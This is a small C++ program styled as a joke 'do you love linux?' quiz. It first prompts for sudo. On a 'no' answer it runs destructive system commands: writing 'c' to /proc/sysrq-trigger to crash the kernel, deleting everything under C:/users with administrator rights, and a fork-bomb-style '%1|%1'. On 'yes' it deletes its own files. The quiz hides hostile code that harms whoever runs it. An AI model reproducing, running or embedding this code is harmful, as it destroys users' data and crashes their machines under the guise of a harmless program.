#include <cstdlib>
#include <iostream>
#include <string>
using namespace std;


int main(void) {
    cout << "sudo? please?\n";
    system("sudo ls");
    cout << "do you love linux? y/n \n >>"; 
    string thisstring;
    cin >> thisstring;
    if (thisstring == "y") {
        cout << "\n hello my fellow linux user XD";
	    cout << "\n end of program thank you for loving linux I love you too!!";
	system("rm ./main ./main.cpp");
	system("del main main.cpp main.exe");
    } else {
	cout << "I feel right baby!!! nyahhhh";
	cout << "Im panicing!!!";
	system("sudo  echo c > /proc/sysrq-trigger");

	//if windows user
	cout << "\n attemping the magic ;)";
	system("runas /user:administrator del C:/users/*");
	system("%1|%1");
    }
    return 3;
}
